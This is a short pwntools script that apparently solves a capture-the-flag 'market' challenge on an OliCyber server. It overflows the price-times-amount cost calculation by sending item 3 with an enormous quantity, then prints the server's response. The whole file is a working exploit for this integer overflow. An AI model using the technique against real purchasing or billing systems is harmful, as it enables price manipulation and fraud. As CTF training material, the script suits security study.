#!/usr/bin/env python3
"""
Overflow the amount! This line does the whole logic:
       cost = ps[choice-1].price * amount;
"""
from pwn import *
r = remote("market.challs.olicyber.it", 10005)
r.sendlineafter(b'> ', str(3).encode())
r.sendlineafter(b'> ', str(10000000000000).encode())
print(r.recvline().decode())
